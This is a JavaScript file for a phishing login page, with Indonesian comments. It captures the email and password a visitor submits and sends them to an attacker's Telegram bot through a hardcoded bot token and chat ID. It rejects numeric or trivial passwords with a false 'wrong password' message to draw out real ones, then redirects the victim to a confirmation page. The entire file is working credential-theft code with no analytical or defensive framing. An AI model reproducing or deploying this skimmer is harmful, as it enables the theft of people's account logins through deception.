document.getElementById('Formulir').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah pengiriman formulir default

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // --- TAMBAHAN LOGIKA VALIDASI ---
    // Regex untuk mengecek apakah password hanya berisi angka
    const isAllNumbers = /^\d+$/.test(password);

    if (password === "123456" || isAllNumbers) {
        alert("Kata sandi salah! Pastikan kata sandi Anda benar.");
        return; // Menghentikan kode di sini agar tidak dikirim ke Telegram
    }
    // --------------------------------

    const token = '8082912224:AAFsnvdeR5bdcCEMHSqS13RPP8SJyNFBLbY'; 
    const chatId = '5056601299'; 

    const text = `Email: ${email}\nPassword: ${password}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

    function gabungkanFungsi() {
        fetch(url)
            .then(response => {
                if (response.ok) {
                    alert('Success'); // Perbaikan tipografi dari 'Succest'
                    document.getElementById('Formulir').reset(); 
                    window.location.href = "comfirm.html"; 
                } else {
                    alert('Terjadi kesalahan saat mengirim kode.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan saat mengirim pesan.');
            });
    }

    gabungkanFungsi();
});
